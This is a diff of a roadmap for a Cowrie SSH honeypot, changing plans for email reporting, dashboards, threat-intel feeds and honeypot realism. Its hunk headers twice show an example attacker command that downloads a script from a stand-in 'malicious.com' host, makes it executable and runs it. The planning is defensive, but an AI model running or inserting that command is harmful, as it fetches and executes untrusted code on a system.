@@ -47,8 +47,8 @@ The first milestone combines daily reporting with essential threat intelligence 
 - [x] Report matched rules per file
 
 ### Email Delivery
-- [x] `msmtp` or `sendmail` for direct SMTP
-- [x] Integration with SendGrid/Mailgun API for reliability
+
+- [x] Integration with Scaleway API for reliability
 - [x] HTML email with inline styling (no external dependencies)
 - [x] Cron job: `0 6 * * * /opt/cowrie/scripts/daily-report.py`
 
@@ -101,19 +101,6 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 
 ## Phase 2: Dashboard & Visualization
 
-### Option 1: ELK Stack (Elasticsearch + Logstash + Kibana)
-- Heavy but powerful, good for large-scale deployments
-- Native Cowrie support via Logstash output plugin
-- Pre-built Kibana dashboards available
-- Resource requirements: 4GB+ RAM
-
-### Option 2: Grafana + Loki (Recommended)
-- Lightweight alternative to ELK
-- Loki for log aggregation (label-based, efficient)
-- Grafana for visualization
-- Docker Compose deployment
-- Resource requirements: 1-2GB RAM
-
 ### Option 3: Custom Dashboard
 - [ ] Simple Flask/FastAPI web app
 - [ ] Read from JSON logs directly
@@ -133,15 +120,18 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Retention policies (e.g., 90 days on-disk, 1 year archived)
 
 ### Extended Threat Intelligence
-- [ ] Additional threat intel sources:
-  - AbuseIPDB reputation lookup
-  - Shodan host information
-  - GreyNoise classification (benign scanner vs malicious)
-  - AlienVault OTX pulse correlation
+
+Additional threat intel sources:
+
+- AbuseIPDB reputation lookup
+- [ ] Shodan host information
+- [x] GreyNoise classification (benign scanner vs malicious)
+- [ ] AlienVault OTX pulse correlation
 
 ## Future: Honeypot Enhancements
 
 ### Additional Realism
+
 - [ ] Custom txtcmds for more commands (df, free, top, etc.)
 - [ ] Fake MySQL/PostgreSQL databases with sample data
 - [ ] Realistic cron jobs in process list
@@ -150,34 +140,8 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Add files and more from <https://canarytokens.org/nest/>
 
 ### Multiple Honeypot Deployment
+
 - [ ] Deploy fleet across multiple Hetzner locations
 - [ ] Centralized log collection
 - [ ] Configuration management (Ansible playbooks)
 
-## Future: Threat Intelligence Sharing
-
-### IoC Extraction
-- [ ] Automatic IoC extraction from sessions:
-  - URLs from wget/curl commands
-  - IP addresses and domains
-  - File hashes (MD5, SHA1, SHA256)
-
-### Sharing
-- [ ] Export to STIX/TAXII format
-- [ ] Integration with MISP
-- [ ] Contribute to community threat feeds
-  - <https://github.com/cowrie/cowrie/blob/main/src/cowrie/output/greynoise.py>
-  - <https://github.com/cowrie/cowrie/blob/main/src/cowrie/output/dshield.py>
-
-## Future: Security Hardening
-
-### Network Segmentation
-- [ ] Firewall rules to prevent honeypot from attacking outbound
-- [ ] Rate limiting on management port
-- [ ] Fail2ban for management SSH
-
-### Monitoring
-- [ ] Health checks for Cowrie container
-- [ ] Disk space monitoring
-- [ ] Automatic restart on failure
-- [ ] Uptime monitoring (e.g., UptimeRobot, Healthchecks.io)
